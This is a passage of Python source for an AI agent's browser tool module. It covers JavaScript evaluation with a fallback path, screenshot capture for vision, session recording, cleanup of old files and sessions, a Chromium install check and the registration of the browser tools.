            if sup_result.get("ok"):
                raw_result = sup_result.get("result")
                # Match the agent-browser path: if the value is a JSON string,
                # parse it so the model gets structured data.
                parsed = raw_result
                if isinstance(raw_result, str):
                    try:
                        parsed = json.loads(raw_result)
                    except (json.JSONDecodeError, ValueError):
                        pass  # keep as string
                response = {
                    "success": True,
                    "result": parsed,
                    "result_type": type(parsed).__name__,
                    "method": "cdp_supervisor",
                }
                return json.dumps(response, ensure_ascii=False, default=str)
            # JS exception is a real failure — surface it instead of falling
            # through to the subprocess path (which would just re-run and
            # produce the same exception, but slower).
            err = sup_result.get("error") or "evaluate_runtime failed"
            if "supervisor" not in err.lower():
                # Real JS-side error — return it.
                return json.dumps({"success": False, "error": err}, ensure_ascii=False)
            # Supervisor-side failure (loop down, no session) — fall through.
            logger.debug(
                "browser_eval: supervisor path unavailable (%s), falling back to subprocess",
                err,
            )
    except ImportError:
        pass
    except Exception as exc:  # pragma: no cover — defensive
        logger.debug("browser_eval: supervisor path errored (%s), falling back", exc)

    # --- Fallback: agent-browser CLI subprocess (original path) -------------
    result = _run_browser_command(effective_task_id, "eval", [expression])

    if not result.get("success"):
        err = result.get("error", "eval failed")
        # Detect backend capability gaps and give the model a clear signal
        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
            response = {
                "success": False,
                "error": f"JavaScript evaluation is not supported by this browser backend. {err}",
            }
            return json.dumps(_copy_fallback_warning(response, result))
        # A live DOM node / NodeList / Window can't be JSON-serialized by CDP
        # and fails the eval with "Object reference chain is too long".  The
        # supervisor fast path retries with returnByValue=false, but the CLI
        # subprocess can't, so turn the cryptic protocol error into actionable
        # guidance instead of surfacing it raw.
        if "reference chain is too long" in err.lower():
            response = {
                "success": False,
                "error": (
                    "Expression returned a live DOM node / NodeList / Window, "
                    "which can't be serialized. Extract a primitive value "
                    "(e.g. .innerText, .href, .src, .value) or use "
                    "JSON.stringify() / a snapshot tool instead."
                ),
            }
            return json.dumps(_copy_fallback_warning(response, result))
        response = {
            "success": False,
            "error": err,
        }
        return json.dumps(_copy_fallback_warning(response, result))

    data = result.get("data", {})
    raw_result = data.get("result")

    # The eval command returns the JS result as a string.  If the string
    # is valid JSON, parse it so the model gets structured data.
    parsed = raw_result
    if isinstance(raw_result, str):
        try:
            parsed = json.loads(raw_result)
        except (json.JSONDecodeError, ValueError):
            pass  # keep as string

    response = {
        "success": True,
        "result": parsed,
        "result_type": type(parsed).__name__,
    }
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False, default=str)




def _maybe_start_recording(task_id: str):
    """Start recording if browser.record_sessions is enabled in config."""
    with _cleanup_lock:
        if task_id in _recording_sessions:
            return
    try:
        from marlow_cli.config import read_raw_config
        marlow_home = get_marlow_home()
        cfg = read_raw_config()
        record_enabled = cfg_get(cfg, "browser", "record_sessions", default=False)

        if not record_enabled:
            return

        recordings_dir = marlow_home / "browser_recordings"
        recordings_dir.mkdir(parents=True, exist_ok=True)
        _cleanup_old_recordings(max_age_hours=72)

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"

        result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
        if result.get("success"):
            with _cleanup_lock:
                _recording_sessions.add(task_id)
            logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
        else:
            logger.debug("Could not start auto-recording: %s", result.get("error"))
    except Exception as e:
        logger.debug("Auto-recording setup failed: %s", e)


def _maybe_stop_recording(task_id: str):
    """Stop recording if one is active for this session."""
    with _cleanup_lock:
        if task_id not in _recording_sessions:
            return
    try:
        result = _run_browser_command(task_id, "record", ["stop"])
        if result.get("success"):
            path = result.get("data", {}).get("path", "")
            logger.info("Saved browser recording for session %s: %s", task_id, path)
    except Exception as e:
        logger.debug("Could not stop recording for %s: %s", task_id, e)
    finally:
        with _cleanup_lock:
            _recording_sessions.discard(task_id)


def browser_get_images(task_id: Optional[str] = None) -> str:
    """
    Get all images on the current page.

    Args:
        task_id: Task identifier for session isolation

    Returns:
        JSON string with list of images (src and alt)
    """

    effective_task_id = _last_session_key(task_id or "default")

    # Use eval to run JavaScript that extracts images
    js_code = """JSON.stringify(
        [...document.images].map(img => ({
            src: img.src,
            alt: img.alt || '',
            width: img.naturalWidth,
            height: img.naturalHeight
        })).filter(img => img.src && !img.src.startsWith('data:'))
    )"""

    result = _run_browser_command(effective_task_id, "eval", [js_code])

    if result.get("success"):
        data = result.get("data", {})
        raw_result = data.get("result", "[]")

        try:
            # Parse the JSON string returned by JavaScript
            if isinstance(raw_result, str):
                images = json.loads(raw_result)
            else:
                images = raw_result

            response = {
                "success": True,
                "images": images,
                "count": len(images)
            }
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
        except json.JSONDecodeError:
            response = {
                "success": True,
                "images": [],
                "count": 0,
                "warning": "Could not parse image data"
            }
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to get images")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> Union[str, Dict[str, Any]]:
    """
    Take a screenshot of the current page for visual inspection.

    Captures what's visually displayed in the browser. When the active model
    supports native vision, the screenshot is attached directly to the
    conversation so the model can inspect it on the next turn. Unsupported image
    capabilities are reported by the configured Codex provider. Useful
    for visual content the text-based snapshot may not capture (CAPTCHAs,
    verification challenges, images, complex layouts, etc.).

    The screenshot is saved persistently and its file path is returned so it
    can be shared with users via MEDIA:<path> in the response.

    Args:
        question: What you want to know about the page visually
        annotate: If True, overlay numbered [N] labels on interactive elements
        task_id: Task identifier for session isolation

    Returns:
        A JSON string with vision analysis results and screenshot_path, or a
        multimodal tool-result envelope carrying the screenshot and metadata.
    """

    import base64
    import uuid as uuid_mod
    from marlow_constants import get_marlow_dir
    screenshots_dir = get_marlow_dir("cache/screenshots", "browser_screenshots")
    screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
    effective_task_id = _last_session_key(task_id or "default")

    # Lightpanda has no graphical renderer — pre-route screenshots to Chrome
    # via the fallback helper instead of letting the normal path fail with a
    # CDP error or return a placeholder PNG.  The normal analysis path below
    # still owns base64 encoding, provider routing, resizing retry, redaction,
    # and response shape.
    engine = _get_browser_engine()
    _lp_prerouted = False
    _lp_fallback_warning = None
    if engine == "lightpanda" and _should_inject_engine(engine):
        logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
        screenshot_args = []
        if annotate:
            screenshot_args.append("--annotate")
        fb_result = _chrome_fallback_screenshot(
            effective_task_id, screenshot_args, _get_command_timeout(),
        )
        fb_reason = "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
        fb_result = _annotate_lightpanda_fallback(fb_result, fb_reason)
        if fb_result.get("success"):
            _lp_prerouted = True
            _lp_fallback_warning = fb_result.get("fallback_warning")
            fb_path = fb_result.get("data", {}).get("path", "")
            if fb_path and os.path.exists(fb_path):
                from marlow_constants import get_marlow_dir
                screenshots_dir = get_marlow_dir("cache/screenshots", "browser_screenshots")
                screenshots_dir.mkdir(parents=True, exist_ok=True)
                import shutil as _shutil_vision
                persistent_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
                _shutil_vision.copy2(fb_path, persistent_path)
                screenshot_path = persistent_path
        else:
            logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
            # Fall through to the normal screenshot path so _run_browser_command
            # can still produce the standard fallback metadata/error.
            _lp_prerouted = False

    try:
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
        _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)

        if _lp_prerouted and screenshot_path.exists():
            result = {
                "success": True,
                "data": {
                    "path": str(screenshot_path),
                    "fallback_warning": _lp_fallback_warning,
                    "browser_engine": "chrome",
                    "browser_engine_fallback": {
                        "from": "lightpanda",
                        "to": "chrome",
                        "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                    },
                },
                "fallback_warning": _lp_fallback_warning,
                "browser_engine": "chrome",
                "browser_engine_fallback": {
                    "from": "lightpanda",
                    "to": "chrome",
                    "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                },
            }
        else:
            # Take screenshot using agent-browser
            screenshot_args = []
            if annotate:
                screenshot_args.append("--annotate")
            screenshot_args.append("--full")
            screenshot_args.append(str(screenshot_path))
            result = _run_browser_command(
                effective_task_id,
                "screenshot",
                screenshot_args,
                # If the Lightpanda pre-route already failed, force Chrome so
                # _run_browser_command doesn't trigger a redundant LP fallback.
                _engine_override="auto" if _lp_prerouted else None,
            )

        if not result.get("success"):
            error_detail = result.get("error", "Unknown error")
            error_response = {
                "success": False,
                "error": f"Failed to take screenshot: {error_detail}"
            }
            return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)

        actual_screenshot_path = result.get("data", {}).get("path")
        if actual_screenshot_path:
            screenshot_path = Path(actual_screenshot_path)

        # Check if screenshot file was created
        if not screenshot_path.exists():
            return json.dumps({
                "success": False,
                "error": (
                    f"Screenshot file was not created at {screenshot_path}. "
                    f"This may indicate a socket path issue (macOS /var/folders/), "
                    f"a missing Chromium install ('agent-browser install'), "
                    f"or a stale daemon process."
                ),
            }, ensure_ascii=False)

        # Convert screenshot to base64 at full resolution.
        _screenshot_bytes = screenshot_path.read_bytes()
        _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
        data_url = f"data:image/png;base64,{_screenshot_b64}"

        # Return pixels to the active Codex turn; no auxiliary inference.
        from tools.vision_tools import _build_native_vision_tool_result

        native_result = _build_native_vision_tool_result(
            image_url=str(screenshot_path), question=question,
            image_data_url=data_url, image_size_bytes=len(_screenshot_bytes),
        )
        meta = native_result.setdefault("meta", {})
        meta["screenshot_path"] = str(screenshot_path)
        if _lp_fallback_warning:
            meta["fallback_warning"] = _lp_fallback_warning
        if annotate and result.get("data", {}).get("annotations"):
            meta["annotations"] = result["data"]["annotations"]
        native_result["text_summary"] = (
            f"{native_result.get('text_summary', '')} Screenshot path: {screenshot_path}"
        ).strip()
        return native_result

    except Exception as e:
        # Keep the screenshot if it was captured successfully — the failure is
        # in the LLM vision analysis, not the capture.  Deleting a valid
        # screenshot loses evidence the user might need.  The 24-hour cleanup
        # in _cleanup_old_screenshots prevents unbounded disk growth.
        logger.warning("browser_vision failed: %s", e, exc_info=True)
        error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
        if screenshot_path.exists():
            error_info["screenshot_path"] = str(screenshot_path)
            error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
        _copy_fallback_warning(error_info, result if 'result' in locals() else {})
        return json.dumps(error_info, ensure_ascii=False)


def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24):
    """Remove browser screenshots older than max_age_hours to prevent disk bloat.

    Throttled to run at most once per hour per directory to avoid repeated
    scans on screenshot-heavy workflows.
    """
    key = str(screenshots_dir)
    now = time.time()
    if now - _last_screenshot_cleanup_by_dir.get(key, 0.0) < 3600:
        return
    _last_screenshot_cleanup_by_dir[key] = now

    try:
        cutoff = time.time() - (max_age_hours * 3600)
        for f in screenshots_dir.glob("browser_screenshot_*.png"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old screenshot %s: %s", f, e)
    except Exception as e:
        logger.debug("Screenshot cleanup error (non-critical): %s", e)


def _cleanup_old_recordings(max_age_hours=72):
    """Remove browser recordings older than max_age_hours to prevent disk bloat."""
    try:
        marlow_home = get_marlow_home()
        recordings_dir = marlow_home / "browser_recordings"
        if not recordings_dir.exists():
            return
        cutoff = time.time() - (max_age_hours * 3600)
        for f in recordings_dir.glob("session_*.webm"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old recording %s: %s", f, e)
    except Exception as e:
        logger.debug("Recording cleanup error (non-critical): %s", e)


# ============================================================================
# Cleanup and Management Functions
# ============================================================================

def cleanup_browser(task_id: Optional[str] = None) -> None:
    """Close and forget the browser session for a task."""
    task_id = task_id or "default"
    _cleanup_single_browser_session(task_id)
    _last_active_session_key.pop(task_id, None)


def _cleanup_single_browser_session(task_id: str) -> None:
    """Internal: reap a single browser session by its exact session key."""
    # Stop the CDP supervisor for this task FIRST so we close our WebSocket
    # before the backend tears down the underlying CDP endpoint.
    _stop_cdp_supervisor(task_id)

    logger.debug("cleanup_browser called for task_id: %s", task_id)
    logger.debug("Active sessions: %s", list(_active_sessions.keys()))

    # Check if session exists (under lock), but don't remove yet -
    # _run_browser_command needs it to build the close command.
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id)

    if session_info:
        logger.debug("Found browser session for task %s", task_id)

        # Stop auto-recording before closing (saves the file)
        _maybe_stop_recording(task_id)

        # Try to close via agent-browser first (needs session in _active_sessions)
        try:
            _run_browser_command(task_id, "close", [], timeout=10)
            logger.debug("agent-browser close command completed for task %s", task_id)
        except Exception as e:
            logger.warning("agent-browser close failed for task %s: %s", task_id, e)

        # Now remove from tracking under lock
        with _cleanup_lock:
            _active_sessions.pop(task_id, None)
            _session_last_activity.pop(task_id, None)

        # Kill the daemon process and clean up socket directory
        session_name = session_info.get("session_name", "")
        if session_name:
            socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
            if os.path.exists(socket_dir):
                # agent-browser writes {session}.pid in the socket dir
                pid_file = os.path.join(socket_dir, f"{session_name}.pid")
                if os.path.isfile(pid_file):
                    try:
                        from tools.process_registry import ProcessRegistry
                        daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
                        ProcessRegistry._terminate_host_pid(daemon_pid)
                        logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
                    except (ProcessLookupError, ValueError, PermissionError, OSError):
                        logger.debug("Could not kill daemon pid for %s (already dead or inaccessible)", session_name)
                shutil.rmtree(socket_dir, ignore_errors=True)

        logger.debug("Removed task %s from active sessions", task_id)
    else:
        logger.debug("No active session found for task_id: %s", task_id)


def cleanup_all_browsers() -> None:
    """
    Clean up all active browser sessions.

    Useful for cleanup on shutdown.
    """
    with _cleanup_lock:
        task_ids = list(_active_sessions.keys())
    for task_id in task_ids:
        cleanup_browser(task_id)

    # Tear down CDP supervisors for all tasks so background threads exit.
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
        SUPERVISOR_REGISTRY.stop_all()
    except Exception:
        pass

    # Reset cached lookups so they are re-evaluated on next use.
    global _cached_agent_browser, _agent_browser_resolved
    global _cached_command_timeout, _command_timeout_resolved
    global _cached_chromium_installed
    global _cached_browser_engine, _browser_engine_resolved
    _cached_agent_browser = None
    _agent_browser_resolved = False
    _discover_homebrew_node_dirs.cache_clear()
    _cached_command_timeout = None
    _command_timeout_resolved = False
    _cached_chromium_installed = None
    _cached_browser_engine = None
    _browser_engine_resolved = False

# ============================================================================
# Requirements Check
# ============================================================================


# Cache for Chromium discovery. Invalidated by _reset_browser_caches.
_cached_chromium_installed: Optional[bool] = None


def _chromium_search_roots() -> List[str]:
    """Directories to scan for a Chromium / headless-shell build.

    Order mirrors what agent-browser and Playwright actually probe:

    1. ``PLAYWRIGHT_BROWSERS_PATH`` when set (Docker image sets this to
       ``/opt/marlow/.playwright``).
    2. ``~/.cache/ms-playwright`` — Playwright's default on Linux/macOS.
    3. ``~/Library/Caches/ms-playwright`` — Playwright's default on macOS.
    """
    roots: List[str] = []
    env_path = os.environ.get("PLAYWRIGHT_BROWSERS_PATH", "").strip()
    if env_path and env_path != "0":
        roots.append(env_path)
    home = os.path.expanduser("~")
    roots.append(os.path.join(home, ".cache", "ms-playwright"))
    if sys.platform == "darwin":
        roots.append(os.path.join(home, "Library", "Caches", "ms-playwright"))
    return roots


def _chromium_installed() -> bool:
    """Return True when a usable Chromium (or headless-shell) build is on disk.

    Checks, in order:

    1. ``AGENT_BROWSER_EXECUTABLE_PATH`` env var — the official way to point
       agent-browser at a pre-installed Chrome/Chromium.
    2. System Chrome/Chromium in PATH (``google-chrome``, ``chromium``,
       ``chromium-browser``, ``chrome``).
    3. Playwright's browser cache (current logic) — directories containing
       ``chromium-*`` or ``chromium_headless_shell-*``.

    agent-browser (0.26+) downloads Playwright's chromium / headless-shell
    builds into ``PLAYWRIGHT_BROWSERS_PATH`` and won't start without at least
    one of the three above being present.  Without a browser binary the CLI
    hangs on first use until the command timeout fires (often ~30s).  Guarding
    the tool behind this check prevents advertising a capability that will
    fail at runtime.
    """
    global _cached_chromium_installed
    if _cached_chromium_installed is not None:
        return _cached_chromium_installed

    # 1. AGENT_BROWSER_EXECUTABLE_PATH — explicit user-configured browser
    ab_path = os.environ.get("AGENT_BROWSER_EXECUTABLE_PATH", "").strip()
    if ab_path:
        if os.path.isfile(ab_path) or shutil.which(ab_path):
            _cached_chromium_installed = True
            return True

    # 2. System Chrome/Chromium in PATH (common names)
    system_chrome = (
        shutil.which("google-chrome")
        or shutil.which("chromium")
        or shutil.which("chromium-browser")
        or shutil.which("chrome")
    )
    if system_chrome:
        _cached_chromium_installed = True
        return True

    # 3. Playwright browser cache (legacy — chromium-* / chromium_headless_shell-* dirs)
    for root in _chromium_search_roots():
        if not root or not os.path.isdir(root):
            continue
        try:
            entries = os.listdir(root)
        except OSError:
            continue
        # Playwright names them ``chromium-<build>`` and
        # ``chromium_headless_shell-<build>``; agent-browser accepts either.
        for entry in entries:
            if entry.startswith("chromium-") or entry.startswith(
                "chromium_headless_shell-"
            ):
                _cached_chromium_installed = True
                return True

    _cached_chromium_installed = False
    return False


def _running_in_docker() -> bool:
    """Best-effort detection of whether we're inside a Docker container."""
    if os.path.exists("/.dockerenv"):
        return True
    try:
        with open("/proc/1/cgroup", "rt", encoding="utf-8") as fp:
            return "docker" in fp.read()
    except OSError:
        return False


def check_browser_requirements() -> bool:
    """Return whether local launch or an attached CDP browser is usable."""

    # CDP override mode can connect to an existing remote/local browser endpoint
    # without requiring the local agent-browser binary on PATH.
    if _get_cdp_override():
        return True

    # The agent-browser CLI is required for local launch.
    try:
        _find_agent_browser()
    except FileNotFoundError:
        return False

    # Local mode with Lightpanda can provide text/navigation tools without a
    # local Chromium install. Chrome fallback, screenshots, and browser_vision
    # will still return actionable Chromium install errors if invoked.
    if _using_lightpanda_engine():
        return True

    # Local Chrome mode: agent-browser needs a Chromium build on disk. Without
    # it the CLI hangs on first use until the command timeout fires.
    if not _chromium_installed():
        return False

    return True


def check_browser_vision_requirements() -> bool:
    """Whether ``browser_vision`` should be advertised to the model.

    Requires BOTH a working browser (``check_browser_requirements``) AND a
    resolvable vision backend. Without the vision check, the tool stays in
    the model's tool list even when no vision provider is configured, then
    fails at call time with a cryptic provider-side error like
    ``unknown variant `image_url`, expected `text``` (issue #31179).
    """
    if not check_browser_requirements():
        return False
    try:
        from tools.vision_tools import check_vision_requirements
    except ImportError:
        return False
    return check_vision_requirements()


# ============================================================================
# Module Test
# ============================================================================

if __name__ == "__main__":
    """
    Simple test/demo when run directly
    """
    print("🌐 Browser Tool Module")
    print("=" * 40)

    print("   Mode: attached CDP" if _get_cdp_override() else "   Mode: local")

    # Check requirements
    if check_browser_requirements():
        print("✅ All requirements met")
    else:
        print("❌ Missing requirements:")
        try:
            _find_agent_browser()
            if not _get_cdp_override() and not _chromium_installed():
                print("   - Chromium browser binary not found")
                searched = ", ".join(_chromium_search_roots()) or "(no candidate paths)"
                print(f"     Searched: {searched}")
                if _running_in_docker():
                    print(
                        "     Docker: rebuild the image — the current one "
                        "predates the bundled Chromium install"
                    )
                    print("       docker compose build --pull")
                else:
                    print("     Install it with:")
                    print("       npx agent-browser install --with-deps")
                    print("     Or:  npx playwright install --with-deps chromium")
        except FileNotFoundError:
            print("   - agent-browser CLI not found")
            print(f"     Install: {_browser_install_hint()}")

    print("\n📋 Available Browser Tools:")
    for schema in BROWSER_TOOL_SCHEMAS:
        print(f"  🔹 {schema['name']}: {schema['description'][:60]}...")

    print("\n💡 Usage:")
    print("  from tools.browser_tool import browser_navigate, browser_snapshot")
    print("  result = browser_navigate('https://example.com', task_id='my_task')")
    print("  snapshot = browser_snapshot(task_id='my_task')")


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------
from tools.registry import registry, tool_error

_BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}

registry.register(
    name="browser_navigate",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
    handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🌐",
)
registry.register(
    name="browser_snapshot",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_snapshot"],
    handler=lambda args, **kw: browser_snapshot(
        full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
    check_fn=check_browser_requirements,
    emoji="📸",
)
registry.register(
    name="browser_click",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_click"],
    handler=lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="👆",
)
registry.register(
    name="browser_type",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_type"],
    handler=lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="⌨️",
)
registry.register(
    name="browser_scroll",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
    handler=lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="📜",
)
registry.register(
    name="browser_back",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_back"],
    handler=lambda args, **kw: browser_back(task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="◀️",
)
registry.register(
    name="browser_press",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_press"],
    handler=lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="⌨️",
)

registry.register(
    name="browser_get_images",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
    handler=lambda args, **kw: browser_get_images(task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🖼️",
)
registry.register(
    name="browser_vision",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_vision"],
    handler=lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
    check_fn=check_browser_vision_requirements,
    emoji="👁️",
)
registry.register(
    name="browser_console",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_console"],
    handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🖥️",
)
